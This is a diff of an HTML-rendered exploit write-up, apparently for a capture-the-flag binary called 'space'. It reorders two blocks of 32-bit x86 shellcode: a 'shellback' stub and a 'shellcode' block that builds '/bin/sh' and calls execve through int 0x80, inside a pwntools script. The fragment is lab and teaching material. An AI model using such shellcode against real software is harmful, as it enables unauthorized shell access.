@@ -273,6 +273,13 @@ pwndbg></span><span class="p"> x/3i $esp
 
 shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./space"</span><span class="p">)
 
+shellback</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
+    push 0xb        # execve()
+    pop eax         # $eax = execve()
+
+    jmp $+0xe       # short jump
+"""</span><span class="p">)
+
 shellcode</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
     push 0x68       # $esp = &"h"
     pushw 0x732f    # $esp = &"/sh"
@@ -283,13 +290,6 @@ shellcode</span><span class="o"> =</span><span class="p"> (</span><span class="s
     cdq             # $edx = NULL
 
     int 0x80        # syscall
-"""</span><span class="p">)
-
-shellback</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
-    push 0xb        # execve()
-    pop eax         # $eax = execve()
-
-    jmp $+0xe       # short jump
 """</span><span class="p">)
 
 payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
